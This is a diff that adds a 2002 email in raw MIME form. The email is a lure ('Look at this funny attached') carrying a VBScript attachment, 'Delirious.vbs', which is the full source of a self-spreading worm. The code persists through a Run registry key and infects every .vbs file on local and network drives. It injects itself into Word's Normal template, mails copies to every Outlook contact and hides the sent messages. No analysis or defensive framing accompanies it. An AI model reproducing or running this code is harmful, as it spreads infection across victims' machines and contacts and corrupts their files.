@@ -1,0 +1,155 @@
+From: "Gilbert GAUMAN" <etiennek75@hotmail.com>
+To: "petikvx@multimania.com"
+Subject: Delirious EMail from Etienne
+Date: Tue, 5 Feb 2002 11:27:01 +0100
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_01C1AE38.0A69EC00"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_01C1AE38.0A69EC00
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Hi PetiKVX,
+Look at this funny attached.
+
+Best Regards Etienne
+
+------=_NextPart_000_0012_01C1AE38.0A69EC00
+Content-Type: application/octet-stream;
+	name="Delirious.vbs"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	filename="Delirious.vbs"
+
+'VBS.Delirious
+'Written by PetiK on 06/28/2001 in France
+On Error Resume Next
+Set sf=3DCreateObject("Scripting.FileSystemObject")
+Set ws=3DCreateObject("WScript.Shell")
+Set fl=3Dsf.OpenTextFile(WScript.ScriptFullName,1)
+virus=3Dfl.ReadAll
+Set win=3Dsf.GetSpecialFolder(0)
+Set sys=3Dsf.GetSpecialFolder(1)
+
+Set cpy=3Dsf.GetFile(WScript.ScriptFullName)
+cpy.Copy(win&"\Delirious.vbs")
+r=3D("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire")
+ws.RegWrite r,(win&"\Delirious.vbs")
+
+If cpy <> (win&"\Delirious.vbs") Then
+MsgBox cpy&" is not a VBS file valid.",vbcritical,cpy
+else
+
+Disque()
+Word()
+Spread()
+If Day(Now)=3D1 Then
+MsgBox "Look at my new virus !"+VbCrLf+"Delirious, isn't it =
+??",vbinformation,"VBS.Delirious coded by PetiK (c)2001"
+End If
+
+bureau=3Dws.SpecialFolders("Desktop")
+Set link=3Dws.CreateShortCut(bureau&"\Site_Web.url")
+link.TargetPath=3D"http://www.jememarre.com"
+link.Save
+
+End If
+
+Sub Disque
+If not sf.FileExists (sys&"\DeliriousFile.txt") Then
+Set DF=3Dsf.CreateTextFile(sys&"\DeliriousFile.txt")
+DF.WriteLine "Infected file by VBS.Delirious"
+DF.WriteLine "Fichiers infect=E9s par VBS.Delirious :"
+DF.WriteBlankLines(1)
+DF.Close
+End If
+Set dr=3Dsf.Drives
+For Each d in dr
+If d.DriveType=3D2 or d.DriveType=3D3 Then
+liste(d.path&"\")
+End If
+Next
+End Sub
+Sub infection(dossier)
+Set f=3Dsf.GetFolder(dossier)
+Set fc=3Df.Files
+For Each F in fc
+ext=3Dsf.GetExtensionName(F.path)
+ext=3Dlcase(ext)
+If (ext=3D"vbs") Then
+Set verif=3Dsf.OpenTextFile(F.path, 1, False)
+If verif.ReadLine <> "'VBS.Delirious" Then
+tout=3Dverif.ReadAll()
+verif.Close
+Set inf=3Dsf.OpenTextFile(F.path, 2, True)
+inf.Write(virus)
+inf.Write(tout)
+inf.Close
+Set DF=3Dsf.OpenTextFile(sys&"\DeliriousFile.txt", 8, True)
+DF.WriteLine F.path
+DF.Close
+End If
+End If
+Next
+End Sub
+Sub liste(dossier)
+Set f=3Dsf.GetFolder(dossier)
+Set sd=3Df.SubFolders
+For Each F in sd
+infection(F.path)
+liste(F.path)
+Next
+End Sub
+
+Sub Word()
+On Error Resume Next
+Set CODE=3Dsf.CreateTextFile(sys&"\DeliriousCode.txt")
+CODE.Write(virus)
+CODE.Close
+If ws.RegRead("HKLM\Software\Microsoft\Delirious\InfectNormal") <> "OK" =
+Then
+Set wrd=3DWScript.CreateObject("Word.Application")
+wrd.Visible=3DFalse
+Set NorT=3Dwrd.NormalTemplate.VBProject.VBComponents
+NorT.Import sys&"\DeliriousCode.txt"
+wrd.Run "Normal.ThisDocument.AutoExec"
+wrd.Quit
+ws.RegWrite "HKLM\Software\Microsoft\Delirious\InfectNormal","OK"=20
+End If
+End Sub
+
+Sub Spread()
+WHO=3Dws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Register=
+edOwner")
+Set OA=3DCreateObject("Outlook.Application")
+Set MA=3DOA.GetNameSpace("MAPI")
+For Each C In MA.AddressLists
+If C.AddressEntries.Count <> 0 Then
+For D=3D1 To C.AddressEntries.Count
+Set AD=3DC.AddressEntries(D)
+Set EM=3DOA.CreateItem(0)
+EM.To=3DAD.Address
+EM.Subject=3D"Delirious EMail from " & WHO
+body=3D"Hi " & AD.Name & ","
+body =3D body & VbCrLf & "Look at this funny attached."
+body =3D body & VbCrLf & ""
+body =3D body & VbCrLf & "	Best Regards " & WHO
+EM.Body=3Dbody
+EM.Attachments.Add(win&"\Delirious.vbs")
+EM.DeleteAfterSubmit=3DTrue
+If EM.To <> "" Then
+EM.Send
+End If
+Next
+End If
+Next
+End Sub
+------=_NextPart_000_0012_01C1AE38.0A69EC00--
